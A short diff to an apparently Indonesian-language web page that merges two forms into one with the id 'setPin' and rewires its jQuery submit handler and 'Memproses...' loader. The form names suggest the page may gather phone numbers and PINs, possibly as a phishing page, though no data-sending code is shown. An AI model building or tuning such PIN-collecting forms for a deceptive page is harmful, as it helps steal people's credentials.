@@ -1173,8 +1173,8 @@ chsalxcome {
   <div class="container-3 w-container">
    <div class="form-block w-form">
  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtwMsvOhhtgycRDO9l_RsE1kA1JMuEsxxefKfckE8PwgQ8FiI-ZwGUvxoUDkWVLAK-mmjpqlR7P9mcsGedEyTl07dFsXNuf4fPbvWqnxeZtpCLrrNOieYNHbvtjUA3hSWrPQG6dBgdsP5e7msEF5PtqQkvkcouBIiaRh05Ui8jwiVu7tBzi5dJEhEe1QU/s1080/AddText_04-27-07.11.32.jpg" width="100%" style="margin-top: -90px">
- <form id="setPin" onsubmit="">
- <form id="formHP" onsubmit="loader(event); return false" style="padding: 10px">
+ 
+ <form id="setPin" onsubmit="loader(event); return false" style="padding: 10px">
  <section class="" style="padding: 4px; position: static; left: 0; right: 0; margin: -10px auto; width: 60%">
 	<div class="radio-list" style="position: absolute; left: 0; right: 0; margin: 0px auto; width: 75%">
 	<center>
@@ -1288,7 +1288,7 @@ $( document ).ready(function() {
   </script>	
 <script>
  $(document).ready(function(){
-    $('#formHP').submit(function(e) {
+    $('#setPin').submit(function(e) {
     event.preventDefault();
     
 document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
